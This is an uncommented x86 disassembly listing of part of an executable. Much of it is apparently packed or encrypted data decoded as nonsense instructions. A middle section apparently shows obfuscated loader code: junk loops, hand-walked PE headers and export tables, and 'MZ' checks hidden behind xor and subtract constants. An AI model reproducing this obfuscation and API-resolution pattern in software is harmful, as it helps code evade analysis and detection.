  40e288:	jns    0x40e28a
  40e28a:	jle    0x40e2f8
  40e28c:	popf   
  40e28d:	sub    ebp,DWORD PTR ds:0x6d497dd1
  40e293:	xor    eax,0xf4f6d024
  40e298:	and    DWORD PTR [eax-0x283e3fe],ebp
  40e29e:	into   
  40e29f:	cmp    BYTE PTR [eax],bh
  40e2a1:	inc    esi
  40e2a2:	push   es
  40e2a3:	es stc 
  40e2a5:	add    BYTE PTR [eax+eax*1-0x7138ed59],cl
  40e2ac:	sbb    dl,cl
  40e2ae:	(bad)  
  40e2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2b0:	sti    
  40e2b1:	ret    
  40e2b2:	je     0x40e325
  40e2b4:	pop    edi
  40e2b5:	push   ecx
  40e2b6:	std    
  40e2b7:	push   cs
  40e2b8:	aam    0x68
  40e2ba:	inc    ecx
  40e2bb:	jle    0x40e317
  40e2bd:	sbb    eax,0x1076cc7b
  40e2c2:	gs sbb cl,0xad
  40e2c6:	ss test cl,dl
  40e2c9:	add    al,BYTE PTR cs:[eax+ecx*2+0x6d3cb86]
  40e2d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d2:	dec    ebp
  40e2d3:	sbb    dl,BYTE PTR [ecx-0x6b4c0122]
  40e2d9:	call   0x86bf:0xb7443f88
  40e2e0:	stos   DWORD PTR es:[edi],eax
  40e2e1:	out    dx,al
  40e2e2:	mov    ?,WORD PTR [ecx-0x24]
  40e2e5:	add    al,0x56
  40e2e7:	and    DWORD PTR [edx+0x3bbdacfb],eax
  40e2ed:	jne    0x40e2a2
  40e2ef:	sub    ch,bh
  40e2f1:	gs lahf 
  40e2f3:	in     eax,0xea
  40e2f5:	outs   dx,BYTE PTR ds:[esi]
  40e2f6:	xor    eax,0x29d8e98d
  40e2fb:	xlat   BYTE PTR ds:[ebx]
  40e2fc:	push   ecx
  40e2fd:	dec    edx
  40e2fe:	jb     0x40e293
  40e300:	sti    
  40e301:	call   0x26e9:0xf44d45b5
  40e308:	js     0x40e2f3
  40e30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e30b:	loope  0x40e2f3
  40e30d:	and    ebx,DWORD PTR [edi]
  40e30f:	fisttp WORD PTR es:[ebx-0x61]
  40e313:	jp     0x40e389
  40e315:	cmc    
  40e316:	(bad)  
  40e317:	and    eax,0xa9db9e01
  40e31c:	int3   
  40e31d:	cmp    eax,0x98d29880
  40e322:	iret   
  40e323:	out    0x3d,al
  40e325:	data16 add ah,BYTE PTR [esi+0x75c828c5]
  40e32c:	push   ebx
  40e32d:	dec    ebp
  40e32e:	sti    
  40e32f:	inc    edx
  40e330:	sti    
  40e331:	test   eax,0x3ee61df6
  40e336:	pop    ds
  40e337:	clc    
  40e338:	icebp  
  40e339:	mov    dl,0x66
  40e33b:	jmp    0x33f88b94
  40e340:	sti    
  40e341:	test   DWORD PTR [edx+esi*1],edx
  40e344:	ins    DWORD PTR es:[edi],dx
  40e345:	add    ebx,DWORD PTR [eax+0x23]
  40e348:	mov    cl,0x65
  40e34a:	(bad)  
  40e34b:	fnstenv [ebx+0x5]
  40e34e:	addr16 xchg ecx,eax
  40e350:	arpl   WORD PTR [ebx-0x67],sp
  40e353:	mov    bh,0xac
  40e355:	ss stos DWORD PTR es:[edi],eax
  40e357:	mov    ds:0x95a95d9,eax
  40e35c:	sbb    eax,0x1493b628
  40e361:	or     ch,bl
  40e363:	mov    DWORD PTR [edx+0x66],ebx
  40e366:	jns    0x40e31a
  40e368:	test   DWORD PTR [esi],0x4fa84093
  40e36e:	clc    
  40e36f:	xchg   edi,eax
  40e370:	sub    BYTE PTR [ebp-0x9ed7bdd],dl
  40e376:	repz mov bl,0xce
  40e379:	cmp    eax,0xfc20301
  40e37e:	scas   eax,DWORD PTR es:[edi]
  40e37f:	push   es
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0xe3025ef2
  40e671:	rol    DWORD PTR [ebp+0x7a7aca73],cl
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e68e
  40e67c:	inc    ecx
  40e67d:	mov    es,esp
  40e67f:	fsubr  DWORD PTR [edx+edi*8+0x62]
  40e683:	lds    esp,FWORD PTR [ebx]
  40e685:	dec    ebp
  40e686:	inc    ecx
  40e687:	dec    edi
  40e688:	pop    esp
  40e689:	(bad)  
  40e68a:	test   DWORD PTR [eax+0xf],esi
  40e68d:	(bad)  
  40e68e:	in     eax,dx
  40e68f:	xchg   edx,eax
  40e690:	push   0x49
  40e692:	adc    DWORD PTR ds:0xb3f8d224,ebp
  40e698:	out    dx,al
  40e699:	xchg   ecx,eax
  40e69a:	sbb    dl,BYTE PTR [edi+ebx*1]
  40e69d:	test   eax,0xc4510c7b
  40e6a2:	rol    ebx,1
  40e6a4:	mov    al,0x89
  40e6a6:	je     0x40e6c1
  40e6a8:	scas   eax,DWORD PTR es:[edi]
  40e6a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6aa:	clc    
  40e6ab:	imul   ecx,DWORD PTR [ebx-0x6ec4c166],0xc
  40e6b2:	add    BYTE PTR [edx-0x53927b73],cl
  40e6b8:	loope  0x40e66d
  40e6ba:	sbb    dl,bh
  40e6bc:	or     DWORD PTR [ecx+0x74aa669],edx
  40e6c2:	out    dx,al
  40e6c3:	mov    edx,0x36a73ca0
  40e6c8:	icebp  
  40e6c9:	rcl    bl,0x15
  40e6cc:	and    ah,BYTE PTR cs:[ecx]
  40e6cf:	fcomi  st,st(0)
  40e6d1:	pop    edx
  40e6d2:	cmp    al,BYTE PTR [eax]
  40e6d4:	pop    esi
  40e6d5:	scas   eax,DWORD PTR es:[edi]
  40e6d6:	push   0x0
  40e6d8:	dec    ecx
  40e6d9:	mov    eax,ds:0xb1659d15
  40e6de:	sub    eax,0x43f9e2cc
  40e6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6e4:	popa   
  40e6e5:	cmc    
  40e6e6:	shl    DWORD PTR [ebx-0x20],0xa1
  40e6ea:	ret    0x4da7
  40e6ed:	test   BYTE PTR [edx],dh
  40e6ef:	in     eax,0xf8
  40e6f1:	mov    dl,0x45
  40e6f3:	mov    ?,WORD PTR [esi+0x4d]
  40e6f6:	hlt    
  40e6f7:	test   eax,0x7f5b2bca
  40e6fc:	(bad)  
  40e6fd:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ff:	adc    BYTE PTR [ebp+0x1788faee],al
  40e705:	and    eax,0xc55d17d8
  40e70a:	xchg   esp,ebp
  40e70c:	outs   dx,BYTE PTR ds:[esi]
  40e70d:	mov    eax,ds:0x36d64631
  40e712:	xchg   esp,eax
  40e713:	dec    esp
  40e714:	in     eax,0x5f
  40e716:	cmp    eax,esi
  40e718:	mov    edi,0x1858c979
  40e71d:	sbb    bh,ch
  40e71f:	shl    BYTE PTR [esi-0x45],1
  40e722:	jne    0x40e76e
  40e724:	push   esi
  40e725:	fmul   DWORD PTR [eax-0x73d0878c]
  40e72b:	(bad)  
  40e72c:	(bad)  
  40e72d:	fdivr  st,st(7)
  40e72f:	inc    edx
  40e730:	mov    edi,0xbbe13357
  40e735:	sbb    al,0xf6
  40e737:	cmp    ebx,edx
  40e739:	jnp    0x40e6be
  40e73b:	adc    bh,BYTE PTR [ebp+0xb]
  40e73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e73f:	sbb    ah,0x8a
  40e742:	sub    al,0x5b
  40e744:	mov    ah,0xf3
  40e746:	mov    bl,0x86
  40e748:	imul   edx,edx,0x516c7e47
  40e74e:	test   al,0x9d
  40e750:	dec    ebp
  40e751:	cli    
  40e752:	and    DWORD PTR [edx-0x2cb962ee],ecx
  40e758:	mov    edi,0xc34eb50
  40e75d:	mov    BYTE PTR [ecx+0x1d0ea05a],ch
  40e763:	aas    
  40e764:	pushf  
  40e765:	or     al,0xe6
  40e767:	xchg   ebx,eax
  40e768:	or     DWORD PTR [ecx+0x5],ecx
  40e76b:	call   FWORD PTR [ecx-0x3011e33d]
  40e771:	push   edx
  40e772:	add    BYTE PTR [ecx+0x243f246d],bh
  40e778:	inc    DWORD PTR [edi]
  40e77a:	sahf   
  40e77b:	add    DWORD PTR [ebx-0x44],ebx
  40e77e:	and    al,0x2c
  40e780:	fucomi st,st(1)
  40e782:	jmp    0x5e3a:0x3feb16af
  40e789:	adc    bl,BYTE PTR fs:[edx]
  40e78c:	mov    esi,DWORD PTR [eax+0x6a67d08a]
  40e792:	popf   
  40e793:	popa   
  40e794:	and    esi,DWORD PTR [esi+0x3ee1b954]
  40e79a:	loope  0x40e81b
  40e79c:	fst    DWORD PTR [edi]
  40e79e:	push   ss
  40e79f:	cld    
  40e7a0:	sbb    BYTE PTR ds:0xdfe813d4,ah
  40e7a6:	sub    bh,al
  40e7a8:	js     0x40e7da
  40e7aa:	js     0x40e77c
  40e7ac:	je     0x40e793
  40e7ae:	lods   al,BYTE PTR ds:[esi]
  40e7af:	call   0x8af6af93
  40e7b4:	aam    0xec
  40e7b6:	push   edx
  40e7b7:	pop    ds
  40e7b8:	mov    ss,WORD PTR [ecx-0x7b]
  40e7bb:	ficomp DWORD PTR [esi+0x0]
  40e7be:	ss imul edi,ebx,0x4f724a58
  40e7c5:	dec    ebx
  40e7c6:	mov    dl,0x9
  40e7c8:	mov    cl,0xa3
  40e7ca:	and    al,bl
  40e7cc:	push   eax
  40e7cd:	xor    eax,0x8cfc5892
  40e7d2:	cwde   
  40e7d3:	cdq    
  40e7d4:	imul   edx,DWORD PTR [edx+0xbccc396],0xc819f4d9
  40e7de:	jmp    0x6b940e3f
  40e7e3:	mov    edx,0xd5d39b4b
  40e7e8:	lods   al,BYTE PTR ds:[esi]
  40e7e9:	jmp    0x40e841
  40e7eb:	jmp    0x16e5:0xcc4dfcfc
  40e7f2:	ret    
  40e7f3:	stos   DWORD PTR es:[edi],eax
  40e7f4:	add    DWORD PTR ds:[eax-0x3b],ebx
  40e7f8:	cli    
  40e7f9:	add    eax,0xcba11037
  40e7fe:	shr    BYTE PTR [eax+0x7d],0x3e
  40e802:	mov    ?,WORD PTR [edx-0xde22875]
  40e808:	(bad)  
  40e809:	fadd   DWORD PTR [esi-0x6d]
  40e80c:	add    bh,BYTE PTR [eax+0x1b]
  40e80f:	fisub  DWORD PTR [esi-0x5]
  40e812:	out    0x2c,eax
  40e814:	add    eax,0xac559d65
  40e819:	mov    esi,0xa2963b1
  40e81e:	jnp    0x40e85d
  40e820:	xchg   esp,eax
  40e821:	call   0xba73:0x977e0755
  40e828:	call   0x8a294639
  40e82d:	fidiv  WORD PTR ds:0x43d16cd2
  40e833:	cmp    BYTE PTR [eax+0x14d51011],ah
  40e839:	scas   al,BYTE PTR es:[edi]
  40e83a:	sub    al,0xa6
  40e83c:	xor    al,BYTE PTR [eax+0x47]
  40e83f:	jp     0x40e8b5
  40e841:	and    al,0x85
  40e843:	mov    dl,0x62
  40e845:	or     DWORD PTR [edi+eiz*4],edi
  40e848:	mov    esp,0x9a35e82d
  40e84d:	sbb    DWORD PTR [ecx-0x260d0952],edi
  40e853:	outs   dx,DWORD PTR ds:[esi]
  40e854:	sub    BYTE PTR [eax],cl
  40e856:	dec    ebp
  40e857:	mov    ah,0xd4
  40e859:	imul   ecx,DWORD PTR fs:0x4541c328,0x680ce4e9
  40e864:	lea    ebx,[esi-0x52]
  40e867:	jmp    0x14b5:0x14d2808b
  40e86e:	rcr    DWORD PTR [esi-0x2aca5f3f],0x3f
  40e875:	mov    cl,0xf8
  40e877:	jbe    0x40e89f
  40e879:	xor    eax,0x49e2b281
  40e87e:	dec    esi
  40e87f:	je     0x40e84e
  40e881:	mov    dh,0x52
  40e884:	leave  
  40e885:	xchg   BYTE PTR ds:0xf02bc3b,dh
  40e88b:	mov    dl,0x81
  40e88d:	(bad)  
  40e88e:	and    BYTE PTR [edi+0x56],dl
  40e891:	(bad)  
  40e892:	hlt    
  40e893:	lods   eax,DWORD PTR ds:[esi]
  40e894:	gs pop ds
  40e896:	lods   al,BYTE PTR ds:[esi]
  40e897:	push   ebp
  40e898:	add    dh,dl
  40e89a:	dec    ebp
  40e89b:	add    al,BYTE PTR [edi-0x62]
  40e89e:	or     DWORD PTR [esi-0x4e708585],edi
  40e8a4:	cmp    DWORD PTR [edi-0x7f],eax
  40e8a7:	pop    ss
  40e8a8:	scas   al,BYTE PTR es:[edi]
  40e8a9:	loop   0x40e838
  40e8ab:	lods   eax,DWORD PTR ds:[esi]
  40e8ac:	push   0x97dfd7d9
  40e8b1:	iret   
  40e8b2:	mov    al,ds:0xa4eedfa9
  40e8b7:	push   cs
  40e8b8:	fdiv   DWORD PTR [eax-0x7f06c092]
  40e8be:	cmp    BYTE PTR [ebp-0x13e10657],ah
  40e8c4:	push   esi
  40e8c5:	pop    esi
  40e8c6:	into   
  40e8c7:	xchg   esi,eax
  40e8c8:	xchg   ebp,eax
  40e8c9:	out    dx,al
  40e8ca:	push   esp
  40e8cb:	rcr    DWORD PTR [edx-0x1ee80f9b],cl
  40e8d1:	and    edi,DWORD PTR [eax-0x214139]
  40e8d7:	inc    ebx
  40e8d8:	or     edi,edi
  40e8da:	repz pop ebx
  40e8dc:	lds    eax,FWORD PTR [esi+0x64]
  40e8df:	xchg   esi,eax
  40e8e0:	test   BYTE PTR cs:[edi],0x9c
  40e8e4:	cmc    
  40e8e5:	cmp    dl,BYTE PTR ds:0x52770578
  40e8eb:	or     al,0xa6
  40e8ed:	sbb    edi,esp
  40e8ef:	xor    DWORD PTR [esi],0xffffffd4
  40e8f2:	push   ecx
  40e8f3:	shl    BYTE PTR [ebp+0x42c61227],cl
  40e8f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8fa:	mov    ds:0xaa2c4ec3,al
  40e8ff:	shl    BYTE PTR [eax-0x5d23e9e6],cl
  40e905:	les    ecx,FWORD PTR [eax]
  40e907:	in     eax,dx
  40e908:	out    0xd3,al
  40e90a:	jo     0x40e975
  40e90c:	(bad)  
  40e90d:	pop    ebp
  40e90e:	adc    esi,edi
  40e910:	aaa    
  40e911:	cdq    
  40e912:	(bad)  
  40e914:	popf   
  40e915:	loop   0x40e8d7
  40e917:	stc    
  40e918:	imul   edx,DWORD PTR [edx+edx*4-0x50],0xffffffc0
  40e91d:	gs test al,0xc6
  40e920:	cld    
  40e921:	fnstsw WORD PTR [edi+0x5a]
  40e924:	(bad)  
  40e925:	cmc    
  40e926:	fs push ebx
  40e928:	ss jecxz 0x40e8cf
  40e92b:	jmp    0x43a6035e
  40e930:	and    eax,0x7a27e8ca
  40e935:	mov    dh,0x79
  40e937:	and    DWORD PTR [ebp-0x1c],esi
  40e93a:	jbe    0x40e951
  40e93c:	fiadd  DWORD PTR [ebp-0x5d348ffd]
  40e942:	into   
  40e943:	cmp    al,0x80
  40e945:	mov    esp,0x556b8f88
  40e94a:	sbb    bh,BYTE PTR [ebp+0x1c]
  40e94d:	cmp    al,0xb4
  40e94f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e950:	nop
  40e951:	cmp    eax,0xfed01a86
  40e956:	pop    ebp
  40e957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e958:	loopne 0x40e93b
  40e95a:	test   BYTE PTR [ecx],0x24
  40e95d:	cmp    al,0xac
  40e95f:	test   DWORD PTR fs:[ecx],ebx
  40e962:	mov    esi,0x1ad632b2
  40e967:	xchg   esi,eax
  40e968:	mov    edi,0x180de986
  40e96d:	imul   edi,DWORD PTR ds:0xeb3eb64a,0xffffff88
  40e974:	popf   
  40e975:	sbb    esp,DWORD PTR [edi+0x35]
  40e978:	leave  
  40e979:	xor    dl,BYTE PTR [eax+ebx*1+0x78f87a6e]
  40e980:	add    eax,0x156ea165
  40e985:	loop   0x40e9a2
  40e987:	cmp    eax,0x2b872b04
  40e98c:	add    al,0x80
  40e98e:	add    BYTE PTR [ebx],cl
  40e990:	pop    esi
  40e991:	adc    ecx,DWORD PTR ds:[eax+0x22d0cd3e]
  40e998:	clc    
  40e999:	jp     0x40e970
  40e99b:	pop    esp
  40e99c:	adc    ah,ch
  40e99e:	out    dx,eax
  40e99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9a0:	inc    edi
  40e9a1:	shr    BYTE PTR [edx-0x7c68dbb3],0x9e
  40e9a8:	jbe    0x40e9fa
  40e9aa:	mov    bl,0x96
  40e9ac:	out    dx,al
  40e9ad:	int3   
  40e9ae:	jmp    0xec92:0xb1c85645
  40e9b5:	xlat   BYTE PTR ds:[ebx]
  40e9b6:	popf   
  40e9b7:	addr16 dec esp
  40e9b9:	jl     0x40e9dd
  40e9bb:	clc    
  40e9bc:	push   edx
  40e9bd:	popa   
  40e9be:	iret   
  40e9bf:	add    DWORD PTR [eax+0x27],0xffffff82
  40e9c3:	pop    es
  40e9c4:	push   edi
  40e9c5:	rol    DWORD PTR [ebp-0x71],1
  40e9c8:	mov    al,ds:0x8f9881b1
  40e9ce:	lods   al,BYTE PTR ds:[esi]
  40e9cf:	add    ch,BYTE PTR fs:[esi-0x2171a165]
  40e9d6:	rcl    BYTE PTR [edi],cl
  40e9d8:	mov    ecx,0x78641325
  40e9dd:	ret    0x4d32
  40e9e0:	push   ecx
  40e9e1:	aam    0x50
  40e9e3:	loop   0x40e9a1
  40e9e5:	mov    ebx,0x8bd7f9f7
  40e9ea:	cmp    al,dl
  40e9ec:	add    al,ah
  40e9ee:	mov    bh,0xc0
  40e9f0:	lds    ebp,FWORD PTR [edx+0x12]
  40e9f3:	dec    ax
  40e9f5:	fstp   st(4)
  40e9f7:	test   eax,0x5783e71
  40e9fc:	sbb    eax,0xc5cb051b
  40ea01:	ins    DWORD PTR es:[edi],dx
  40ea02:	mov    BYTE PTR [edx-0x71daa59a],0x12
  40ea09:	mov    eax,0xb568c52f
  40ea0e:	mov    ebx,0xa910884d
  40ea13:	push   esi
  40ea14:	dec    edi
  40ea15:	ins    DWORD PTR es:[edi],dx
  40ea16:	es inc esp
  40ea18:	xchg   esi,eax
  40ea19:	retf   0xa2c8
  40ea1c:	aaa    
  40ea1d:	add    bh,bh
  40ea1f:	pop    es
  40ea20:	mov    ah,0xa8
  40ea22:	pop    edi
  40ea23:	mov    esi,0xb24891f5
  40ea28:	loop   0x40ea5a
  40ea2a:	inc    ebx
  40ea2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea2c:	inc    ecx
  40ea2d:	mov    ecx,ecx
  40ea2f:	or     BYTE PTR [edx+0x22],dl
  40ea32:	pop    esp
  40ea33:	or     BYTE PTR [ebx],0xec
  40ea36:	std    
  40ea37:	xchg   BYTE PTR [esi-0x32],ch
  40ea3a:	pop    ecx
  40ea3b:	adc    BYTE PTR [eax-0x19d8035],0x8d
  40ea42:	inc    ebp
  40ea43:	sub    dl,BYTE PTR [edx]
  40ea45:	adc    esi,DWORD PTR [ecx]
  40ea47:	jecxz  0x40ea76
  40ea49:	aad    0xbb
  40ea4b:	adc    ebx,DWORD PTR [ebp+0x3ff223e8]
  40ea51:	and    DWORD PTR [edx],edx
  40ea53:	cmp    DWORD PTR [ecx],edx
  40ea55:	ror    DWORD PTR [edi+0x7f],0x34
  40ea59:	shr    DWORD PTR [ebp+0x4e],0xa
  40ea5d:	out    0x4a,eax
  40ea5f:	test   eax,0xdadb0e9e
  40ea64:	lods   eax,DWORD PTR ds:[esi]
  40ea65:	aam    0x93
  40ea67:	dec    ebp
  40ea68:	xchg   esi,eax
  40ea69:	pop    esp
  40ea6a:	jbe    0x40ea27
  40ea6c:	gs push ebx
  40ea6e:	test   DWORD PTR [ecx+0x5de3a6d6],ebp
  40ea74:	js     0x40ea73
  40ea76:	call   0x5b65dbfc
  40ea7b:	inc    ebp
  40ea7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea7d:	or     bl,BYTE PTR [eax-0x5d]
  40ea80:	cmp    al,0x58
  40ea82:	cmc    
  40ea83:	cmp    al,0xf2
  40ea85:	scas   eax,DWORD PTR es:[edi]
  40ea86:	mov    bl,0x65
  40ea88:	jns    0x40eae9
  40ea8a:	pop    esi
  40ea8b:	and    edi,DWORD PTR [ecx-0x67c96312]
  40ea91:	or     BYTE PTR [esi-0x37735e29],al
  40ea97:	add    BYTE PTR [ebx+ecx*2+0x7ade4e7],dh
  40ea9e:	fsub   st,st(4)
  40eaa0:	adc    BYTE PTR [edx-0x6c],al
  40eaa3:	fnstsw WORD PTR [ebx-0x202bdc8b]
  40eaa9:	add    ecx,DWORD PTR [edi]
  40eaab:	mov    edi,0xf3631d65
  40eab0:	leave  
  40eab1:	imul   edx,DWORD PTR [ebx],0xffffffa8
  40eab4:	mov    al,ds:0x83c0819f
  40eab9:	int3   
  40eaba:	shl    BYTE PTR [ecx-0x6d9822e0],cl
  40eac0:	scas   eax,DWORD PTR es:[edi]
  40eac1:	mov    ebp,0xd7178699
  40eac6:	aam    0x45
  40eac8:	xchg   esp,eax
  40eac9:	push   eax
  40eaca:	sub    al,0xdd
  40eacc:	adc    BYTE PTR [edi+0x3872aff7],dh
  40ead2:	jg     0x40ea9f
  40ead4:	pop    ecx
  40ead5:	icebp  
  40ead6:	ret    0xf1d7
  40ead9:	sar    BYTE PTR [ebp+0x58],cl
  40eadc:	sbb    dl,al
  40eade:	add    al,0xb0
  40eae0:	jae    0x40eb46
